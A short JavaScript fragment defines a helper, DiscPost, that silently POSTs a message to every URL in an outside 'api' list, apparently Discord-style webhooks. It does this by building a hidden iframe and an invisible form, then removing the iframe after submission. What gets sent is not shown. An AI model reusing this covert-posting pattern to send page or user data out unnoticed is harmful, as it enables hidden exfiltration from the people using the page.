function DiscPost(msg){
    msg = "`" + msg + "`";
    params = {"content": "`" + msg + "`"};
    method = 'post';
	i = 0;
	do{
	url = api[i];
    // function to remove the iframe
    var removeIframe = function( iframe ){
        iframe.parentElement.removeChild(iframe);
    };
    
    // make a iframe...
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    iframe.onload = function(){
        var iframeDoc = this.contentWindow.document;
        
        // Make a invisible form
        var form = iframeDoc.createElement('form');
        form.method = method;
        form.action = url;
        iframeDoc.body.appendChild(form);
        
        // pass the parameters
        for( var name in params ){
            var input = iframeDoc.createElement('input');
            input.type = 'hidden';
            input.name = name;
            input.value = params[name];
            form.appendChild(input);
        }
        
        form.submit();
        // remove the iframe
        setTimeout( function(){ 
            removeIframe(iframe);
        }, 500);
    };
    
    document.body.appendChild(iframe);
	i++;
	}while (i != api.length);}